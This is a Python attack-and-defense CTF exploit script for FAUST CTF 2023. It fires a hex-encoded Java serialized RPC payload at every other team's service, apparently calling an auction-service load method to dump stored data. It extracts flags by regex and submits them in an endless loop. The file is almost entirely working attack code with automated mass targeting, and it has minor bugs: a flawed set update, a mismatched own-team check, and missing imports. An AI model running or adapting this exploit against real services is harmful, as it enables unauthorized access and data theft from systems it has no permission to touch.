#!/usr/bin/env python3
from pwn import *
import requests
import re

YEAR = 2023
TEAM_NUMBER = 48
SERVICE_NAME = 'tic-tac-toe'
SERVICE_PORT = 12346

FLAG_FORMAT = r'FAUST_[A-Za-z0-9\/+]{32}'
TEAMS_URL = f'https://{YEAR}.faustctf.net/competition/teams.json'
OWN_ADDRESS = f'fd66:666:{TEAM_NUMBER}::2'
OWN_NUM = f'fd66:666:{48}::2'
SUBMISSION_URL = 'submission.faustctf.net'
SUBMISSION_PORT = 666

# exploit dependent variables
context.log_level = 'INFO' # 'DEBUG' | 'INFO' | 'CRITICAL'
context.timeout = 2
context.arch = 'amd64'

all_flags = set()

# @all_flags: previously submitted flags
# @current_flags: flags acquired in the current round
# @return an updated set of previously submitted flags
def submit_flags(all_flags, current_flags):
    with remote(SUBMISSION_URL, SUBMISSION_PORT) as p:
        flags = current_flags - all_flags
        print(p.recvline())
        print(p.recvline())
        print(p.recvline())
        for flag in flags:
            p.sendline(flag)
            resp = p.recvline().strip()
            success(f"{flag} - {resp}")
            all_flags.update(flag)
    return all_flags

# @return: list of target IPs as strings
def get_targets():
    targets = requests.get(TEAMS_URL).json()
    # based on FAUST2021
    # TODO: update IP format string
    target_nums = targets["teams"]
    flag_ids = targets["flag_ids"][SERVICE_NAME]
    return target_nums, flag_ids

def parse(flagid):
    return flagid.split(" ")[-1]

def random_string(N):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# @terget_ip: The address of a machine to exploit
# @flag_ids: All flag IDs returned by the API
# @return: set() of flags acquired
def pwn(target_num, flag_ids):
    flags = set()
    target_flag_ids = flag_ids[str(target_num)]
    vulnbox_ip = f"fd66:666:{target_num}::2"

    #register = s.post(f'http://[{vulnbox_ip}]:{SERVICE_PORT}/register', data={'username': username, 'password': password})
    #login = s.post(f'http://[{vulnbox_ip}]:{SERVICE_PORT}/login', data={'username': username, 'password': password})
    payload = bytes.fromhex("000001afaced00057372002964652e66617573742e61756374696f6e2e636f6d6d756e69636174696f6e2e52504352657175657374832e31d25beefc020200064900086f626a656374494449000e73657175656e63654e756d6265725b0004617267737400135b4c6a6176612f6c616e672f4f626a6563743b4c0008636c69656e7449447400124c6a6176612f6c616e672f537472696e673b4c000a6d6574686f644e616d6571007e00024c0005727063494471007e0002787000000000000000007074002436646630336637322d323164352d343333612d623736362d39376563373638303461336474009f70726f7465637465642073796e6368726f6e697a6564206a6176612e7574696c2e636f6e63757272656e742e436f6e63757272656e74486173684d61703c6a6176612e6c616e672e537472696e672c2064652e66617573742e61756374696f6e2e6d6f64656c2e41756374696f6e456e7472793e2064652e66617573742e61756374696f6e2e41756374696f6e53657276696365496d706c2e6c6f6164282974002461333731333563352d653833332d343666392d613337362d313165353434363836663635")

    import socket
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)

    s.connect((vulnbox_ip, SERVICE_PORT))
    s.send(payload)
    # receive for 1 second
    s.settimeout(1)
    response = b""
    while True:
        try:
            response += s.recv(1024)
        except socket.timeout:
            break

    # match all FAUST_[A-Za-z0-9\/+]{32} flags
    import re
    flags = set(re.findall(b"FAUST_[A-Za-z0-9\/+]{32}", response))
    print(flags)
    
    return flags


def main():
    target_nums, flag_ids = get_targets()
    target_nums = target_nums
    random.shuffle(target_nums)
    global all_flags
    while True:
        for target in target_nums:
            if target == OWN_NUM:
               continue
            info(f'Attacking: {target}')
            try:
                flags = pwn(target, flag_ids)
            except Exception as e:
                log.critical(f'{e}')
                continue

            # submit flags and update acquired flags
            all_flags = submit_flags(all_flags, flags)


if __name__ == '__main__':
    main()
